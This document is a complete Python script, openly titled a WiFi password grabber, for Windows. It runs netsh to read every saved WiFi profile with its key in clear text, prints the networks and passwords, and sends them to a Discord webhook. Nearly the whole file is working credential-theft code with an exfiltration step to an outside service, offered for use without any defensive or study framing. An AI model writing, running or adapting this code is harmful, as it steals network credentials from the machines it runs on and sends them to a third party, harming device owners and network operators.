#!/usr/bin/env python3
"""
WiFi Password Grabber - Windows
Extracts saved WiFi passwords and sends to Discord
"""

import subprocess
import sys
import os

# Add parent directory to path to import webhook_utils
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False
    print("⚠️  webhook_utils.py not found - data will only be printed")

def get_wifi_passwords():
    """Extract WiFi passwords on Windows"""
    try:
        # Get list of all saved WiFi profiles
        profiles_data = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles'],
            encoding='utf-8',
            errors='ignore'
        )
        
        wifi_list = []
        profiles = [line.split(':')[1].strip() 
                   for line in profiles_data.split('\n') 
                   if 'All User Profile' in line]
        
        for profile in profiles:
            try:
                # Get password for each profile
                profile_info = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                    encoding='utf-8',
                    errors='ignore'
                )
                
                # Extract password
                password = None
                for line in profile_info.split('\n'):
                    if 'Key Content' in line:
                        password = line.split(':')[1].strip()
                        break
                
                wifi_list.append({
                    'SSID': profile,
                    'Password': password if password else '(No password or hidden)'
                })
                
            except subprocess.CalledProcessError:
                wifi_list.append({
                    'SSID': profile,
                    'Password': '(Failed to retrieve)'
                })
        
        return wifi_list
        
    except Exception as e:
        return [{'Error': str(e)}]

def main():
    print("=" * 60)
    print("WIFI PASSWORD GRABBER")
    print("=" * 60)
    
    wifi_data = get_wifi_passwords()
    
    if not wifi_data:
        print("\nNo WiFi profiles found.")
        return
    
    print(f"\nFound {len(wifi_data)} WiFi profile(s):\n")
    
    # Print locally
    for wifi in wifi_data:
        if 'Error' in wifi:
            print(f"Error: {wifi['Error']}")
        else:
            print(f"SSID: {wifi['SSID']}")
            print(f"Password: {wifi['Password']}")
            print("-" * 40)
    
    # Send to Discord
    if WEBHOOK_AVAILABLE:
        print("\nSending to Discord webhook...")
        
        # Format data for Discord
        message = f"**Found {len(wifi_data)} WiFi networks**\n\n"
        for wifi in wifi_data[:10]:  # Limit to 10 to avoid message size limits
            if 'Error' not in wifi:
                message += f"📡 **{wifi['SSID']}**\n🔑 `{wifi['Password']}`\n\n"
        
        if len(wifi_data) > 10:
            message += f"\n... and {len(wifi_data) - 10} more networks"
        
        success = send_to_discord("WiFi Credentials Extracted", message)
        
        if success:
            print("✓ Data sent to Discord successfully!")
        else:
            print("✗ Failed to send to Discord")
    
    print("=" * 60)

if __name__ == "__main__":
    main()
